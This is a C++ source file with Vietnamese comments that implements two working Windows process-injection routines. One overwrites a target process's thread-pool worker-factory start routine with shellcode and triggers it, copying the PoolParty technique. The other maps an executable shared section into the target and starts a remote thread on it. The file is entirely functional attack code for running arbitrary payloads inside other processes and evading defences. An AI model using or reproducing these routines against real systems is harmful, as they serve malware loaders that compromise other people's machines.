#include "Technique.h"
#include "Util.h"

BOOL InjectThreadpool(const std::vector<unsigned char>& shellcode, DWORD targetPid)
{
    std::cout << "Using technique 1: Worker Factory Start Routine Overwrite" << std::endl;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto pNtQueryInformationProcess = (myNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    auto pNtQueryInformationWorkerFactory = (myNtQueryInformationWorkerFactory)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
    auto pNtSetInformationWorkerFactory = (myNtSetInformationWorkerFactory)GetProcAddress(hNtdll, "NtSetInformationWorkerFactory");
    auto pNtQueryObject = (myNtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");

    if (!pNtQueryInformationProcess || !pNtQueryInformationWorkerFactory ||
        !pNtSetInformationWorkerFactory || !pNtQueryObject)
    {
        if (!pNtQueryInformationProcess)       std::cerr << "Missing NtQueryInformationProcess" << std::endl;
        if (!pNtQueryInformationWorkerFactory) std::cerr << "Missing NtQueryInformationWorkerFactory" << std::endl;
        if (!pNtSetInformationWorkerFactory)   std::cerr << "Missing NtSetInformationWorkerFactory" << std::endl;
        if (!pNtQueryObject)                   std::cerr << "Missing NtQueryObject" << std::endl;
        return false;
    }

    // ---- TẤT CẢ BIẾN KHAI BÁO Ở ĐÂY ----
    HANDLE      hProcess = NULL;
    HANDLE      hWorkerFactory = NULL;
    bool        result = false;
    NTSTATUS    status = 0;
    ULONG       bufferSize = 0x10000;
    ULONG       returnedLen = 0;
    SIZE_T      bytesWritten = 0;
    ULONG       newMin = 0;
    DWORD       oldProtect = 0;
    DWORD       tmpProtect = 0;
    SIZE_T      regionSize = 0;
    std::vector<unsigned char> buffer;

    WORKER_FACTORY_BASIC_INFORMATION wfInfo = {};

    // 1) OpenProcess với quyền TỐI THIỂU như PoolParty
    hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE |
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ,
        FALSE, targetPid);
    if (!hProcess)
    {
        std::cerr << "OpenProcess failed: " << GetLastError() << std::endl;
        return false;
    }

    // 2) Liệt kê handle của RIÊNG target qua NtQueryInformationProcess
    //    (ProcessHandleInformation = class 51)
    do
    {
        buffer.resize(bufferSize);
        status = pNtQueryInformationProcess(hProcess, PROCESS_HANDLE_INFORMATION_CLASS,
            buffer.data(), bufferSize, &bufferSize);

        if (status == (NTSTATUS)0xC0000004)   // STATUS_INFO_LENGTH_MISMATCH
            bufferSize += 0x1000;
        else
            break;
    } while (bufferSize <= 0x20000000);

    if (!NT_SUCCESS(status))
    {
        std::cerr << "NtQueryInformationProcess failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    // 3) Tìm handle TpWorkerFactory — giống PoolParty: check type trước, dup sau
    {
        auto handles = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(buffer.data());
        for (ULONG_PTR i = 0; i < handles->NumberOfHandles; i++)
        {
            auto& entry = handles->Handles[i];

            // 3a) Duplicate tạm với DUPLICATE_SAME_ACCESS để check type
            HANDLE hDupCheck = NULL;
            if (!DuplicateHandle(hProcess, entry.HandleValue, GetCurrentProcess(),
                &hDupCheck, 0, FALSE, DUPLICATE_SAME_ACCESS))
                continue;

            ULONG qsize = 0;
            NTSTATUS qStatus = pNtQueryObject(hDupCheck, ObjectTypeInformation, nullptr, 0, &qsize);
            if (qStatus != (NTSTATUS)0xC0000004 || qsize == 0)
            {
                CloseHandle(hDupCheck);
                continue;
            }

            auto typeInfo = (POBJECT_TYPE_INFORMATION)malloc(qsize);
            if (!typeInfo)
            {
                CloseHandle(hDupCheck);
                continue;
            }

            qStatus = pNtQueryObject(hDupCheck, ObjectTypeInformation, typeInfo, qsize, nullptr);
            BOOL isWorkerFactory = FALSE;
            if (NT_SUCCESS(qStatus) && typeInfo->TypeName.Buffer && typeInfo->TypeName.Length > 0)
            {
                std::wstring typeName(typeInfo->TypeName.Buffer,
                    typeInfo->TypeName.Length / sizeof(WCHAR));
                if (_wcsicmp(typeName.c_str(), L"TpWorkerFactory") == 0)
                    isWorkerFactory = TRUE;
            }
            free(typeInfo);
            CloseHandle(hDupCheck);

            if (!isWorkerFactory)
                continue;

            // 3b) Duplicate lại với WORKER_FACTORY_ALL_ACCESS (giống PoolParty)
            HANDLE hDupAccess = NULL;
            if (DuplicateHandle(hProcess, entry.HandleValue, GetCurrentProcess(),
                &hDupAccess, WORKER_FACTORY_ALL_ACCESS, FALSE, 0))
            {
                hWorkerFactory = hDupAccess;
                break;
            }
        }
    }

    if (!hWorkerFactory)
    {
        std::cerr << "Failed to find TpWorkerFactory handle in target" << std::endl;
        goto cleanup;
    }
    std::cout << "Found worker factory handle: 0x" << std::hex << hWorkerFactory << std::endl;

    // 4) Query WORKER_FACTORY_BASIC_INFORMATION — dùng struct đầy đủ
    status = pNtQueryInformationWorkerFactory(
        hWorkerFactory,
        WORKER_FACTORY_BASIC_INFORMATION_CLASS,
        &wfInfo,
        sizeof(wfInfo),
        &returnedLen);

    if (!NT_SUCCESS(status))
    {
        std::cerr << "NtQueryInformationWorkerFactory failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    std::cout << "StartRoutine at: 0x" << std::hex << wfInfo.StartRoutine << std::endl;

    if (wfInfo.StartRoutine == NULL || (ULONG_PTR)wfInfo.StartRoutine < 0x10000)
    {
        std::cerr << "StartRoutine looks invalid, aborting." << std::endl;
        goto cleanup;
    }

    // 5) Đổi protection (cần thiết vì page ntdll là RX) → ghi shellcode → khôi phục
    regionSize = shellcode.size();
    if (!VirtualProtectEx(hProcess, wfInfo.StartRoutine, regionSize,
        PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        std::cerr << "VirtualProtectEx failed: " << GetLastError() << std::endl;
        goto cleanup;
    }

    if (!WriteProcessMemory(hProcess, wfInfo.StartRoutine,
        shellcode.data(), shellcode.size(), &bytesWritten) ||
        bytesWritten != shellcode.size())
    {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualProtectEx(hProcess, wfInfo.StartRoutine, regionSize, oldProtect, &tmpProtect);
        goto cleanup;
    }

    VirtualProtectEx(hProcess, wfInfo.StartRoutine, regionSize, oldProtect, &tmpProtect);
    std::cout << "Overwritten StartRoutine at 0x" << std::hex << wfInfo.StartRoutine << std::endl;

    // 6) Trigger: WorkerFactoryThreadMinimum = TotalWorkerCount + 1
    //    (giống PoolParty - đảm bảo lớn hơn TỔNG số worker hiện có)
    newMin = wfInfo.TotalWorkerCount + 1;
    status = pNtSetInformationWorkerFactory(
        hWorkerFactory,
        WORKER_FACTORY_THREAD_MINIMUM_CLASS,
        &newMin,
        sizeof(newMin));

    if (!NT_SUCCESS(status))
    {
        std::cerr << "NtSetInformationWorkerFactory failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }
    std::cout << "Worker Factory triggered at 0x" << std::hex << wfInfo.StartRoutine << std::endl;
    result = true;

cleanup:
    if (hWorkerFactory) CloseHandle(hWorkerFactory);
    if (hProcess)       CloseHandle(hProcess);
    return result;
}
BOOL InjectSectionMapping(const std::vector<unsigned char>& shellcode, DWORD targetPid)
{
    std::cout << "Using technique 2: Shellcode Execution via Section Mapping" << std::endl;

    HMODULE hNtdll = GetModuleHandleA("ntdll");
    myNtCreateSection     fNtCreateSection = (myNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    myNtMapViewOfSection  fNtMapViewOfSection = (myNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");

    if (!fNtCreateSection || !fNtMapViewOfSection || !fRtlCreateUserThread)
        return false;

    // ============================================================
    // KHAI BÁO TẤT CẢ BIẾN Ở ĐÂY, TRƯỚC MỌI goto
    // ============================================================
    HANDLE  hProcess = NULL;
    HANDLE  hSection = NULL;
    HANDLE  hThread = NULL;
    PVOID   localAddress = NULL;
    PVOID   remoteAddress = NULL;
    bool    result = false;
    SIZE_T  viewSize = 0;
    SIZE_T  size = shellcode.size();
    NTSTATUS status = 0;

    // LARGE_INTEGER là union -> phải gán qua .QuadPart,
    // KHÔNG dùng initializer { (LONGLONG)size } (gây C4244/C4838)
    LARGE_INTEGER sectionSize = {};
    sectionSize.QuadPart = (LONGLONG)size;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hProcess)
    {
        std::cerr << "OpenProcess Failed: " << GetLastError() << std::endl;
        return false;
    }

    status = fNtCreateSection(&hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL,
        &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status))
    {
        std::cerr << "NtCreateSection Failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    status = fNtMapViewOfSection(hSection, GetCurrentProcess(),
        &localAddress, 0, 0, NULL, &viewSize, 2 /*ViewShare*/, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        std::cerr << "Local Map Failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    viewSize = 0;
    status = fNtMapViewOfSection(hSection, hProcess,
        &remoteAddress, 0, 0, NULL, &viewSize, 2 /*ViewShare*/, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        std::cerr << "Remote Map Failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    memcpy(localAddress, shellcode.data(), size);

    status = fRtlCreateUserThread(hProcess, NULL, FALSE,
        0, 0, 0, remoteAddress, NULL, &hThread, NULL);
    if (!NT_SUCCESS(status))
    {
        std::cerr << "RtlCreateUserThread Failed: 0x" << std::hex << status << std::endl;
        goto cleanup;
    }

    if (hThread)
        WaitForSingleObject(hThread, INFINITE);

    result = true;

cleanup:
    if (hThread)  CloseHandle(hThread);
    if (hSection) CloseHandle(hSection);
    if (hProcess) CloseHandle(hProcess);
    return result;
}